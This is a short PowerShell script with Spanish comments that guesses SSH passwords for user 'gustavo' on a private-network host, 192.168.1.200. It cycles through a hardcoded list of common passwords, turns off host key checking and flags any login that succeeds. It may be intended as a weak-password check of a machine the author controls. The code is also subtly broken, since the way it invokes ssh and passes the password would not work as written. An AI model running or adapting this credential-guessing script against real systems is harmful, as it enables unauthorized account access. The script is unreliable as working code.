$Servidor = "192.168.1.200"
$Usuario = "gustavo"
$PasswordList = @("admin","gustavo","123456","password","Dragon2026!","Dragon3","letmein")

foreach ($Pass in $PasswordList) {
    # Intentamos conectar con ssh.exe y redirigimos la entrada
    $Cmd = "ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 $Usuario@$Servidor"
    # Usamos un archivo temporal para la contraseña
    $TempFile = New-TemporaryFile
    $Pass | Out-File -FilePath $TempFile -NoNewline
    $Result = Get-Content $TempFile | & $Cmd 2>&1
    Remove-Item $TempFile
    if ($LASTEXITCODE -eq 0) {
        Write-Host "ALERTA: contraseña '$Pass' es válida" -ForegroundColor Red
    } else {
        Write-Host "Falló: $Pass"
    }
}